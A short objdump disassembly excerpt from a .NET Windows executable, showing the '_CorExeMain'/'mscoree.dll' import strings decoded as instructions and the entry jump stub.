  402bc1:	00 5f 43             	add    %bl,0x43(%edi)
  402bc4:	6f                   	outsl  %ds:(%esi),(%dx)
  402bc5:	72 45                	jb     0x402c0c
  402bc7:	78 65                	js     0x402c2e
  402bc9:	4d                   	dec    %ebp
  402bca:	61                   	popa
  402bcb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  402bd2:	72 65                	jb     0x402c39
  402bd4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  402bd8:	6c                   	insb   (%dx),%es:(%edi)
  402bd9:	00 00                	add    %al,(%eax)
  402bdb:	00 00                	add    %al,(%eax)
  402bdd:	00 ff                	add    %bh,%bh
  402bdf:	25 00 20 40 00       	and    $0x402000,%eax
